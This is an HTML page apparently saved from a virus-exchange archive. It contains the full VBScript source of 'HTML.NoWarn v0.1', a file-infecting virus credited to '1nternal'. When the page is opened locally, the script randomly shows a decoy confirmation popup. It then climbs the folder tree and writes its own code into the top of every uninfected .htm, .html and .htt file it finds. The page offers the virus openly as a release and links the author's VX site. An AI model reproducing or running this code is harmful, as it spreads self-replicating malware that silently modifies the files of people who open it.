<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0050)http://vx.netlux.org/bin/html/NoWarn/HTML.NoWarn.a -->
<HTML><HEAD><TITLE>HTML.NoWarn v0.1</TITLE><!--1nternal-->
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content=1nternal name=Author>
<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
<BODY>
<SCRIPT language=VBScript><!--

Private fso, HostPath

Private Sub FindHTMVBS
	cpath = fso.GetParentFolderName(HostPath)
	Set folder = fso.GetFolder(cpath)
	While folder.IsRootFolder = false 
		Set folder = fso.GetFolder(cpath)
		Set fc = folder.Files
		cpath = fso.GetParentFolderName(cpath)
		For each Target in fc
			InfType = Lcase(Fso.GetExtensionName(Target.name))
			if InfType = "htm" or InfType = "html" or InfType = "htt" then
				Set fh = fso.opentextfile(Target.path, 1, true)
				TestString = fh.readline
				fh.close
				If TestString <> "<html> <!--1nternal-->" then
					TempFile = fso.GetTempName
					fso.CopyFile Target.path, TempFile
					Set fh = fso.opentextfile(Hostpath, 1, true)
					Set ft = fso.opentextfile(Target.path, 2, true)
					For I = 1 to 62
						ft.WriteLine fh.ReadLine
					Next
					fh.close
					Set fh = fso.opentextfile(TempFile, 1, true)
					Do While fh.AtEndOfStream <> True  
						ft.WriteLine fh.ReadLine
					Loop
					ft.close
					fh.close
					fso.DeleteFile TempFile
				End IF
			End If
		Next
	Wend
End Sub

Private Sub Window_Onload
	Randomize
	If location.protocol = "file:" AND (Int((6 * Rnd) + 1) = 1) then
		set wcover = window.open ("about:%3Cbody bgcolor=%22%23808080%22%3EAre you sure you want to view the contents of this HTML document?%3C/body%3E", "", "top = 185, left = 227, height = 80, width = 335, toolbar=no, maximize=no, resizeable=no, status=no")
		Set fso = CreateObject("Scripting.FileSystemObject")
		wcover.close
		HostPath = Replace(location.href, "file:///", "")
		HostPath = Replace(HostPath, "/", "\")
		Call FindHTMVBS
		window.status = "HTML.NoWarn v0.1 /1nternal"
	end IF
End Sub
--></SCRIPT>

<META content=1nternal name=Author>
<P align=center>&nbsp;</P>
<P align=center>&nbsp;</P>
<P align=center><STRONG>HTML.NoWarn v0.1</STRONG></P>
<P align=center>/ 1nternal</P>
<P align=center><A 
href="http://www.geocities.com/SiliconValley/Horizon/9386">1nternal's VX 
Site</A></P>
<P>&nbsp;</P></BODY></HTML>
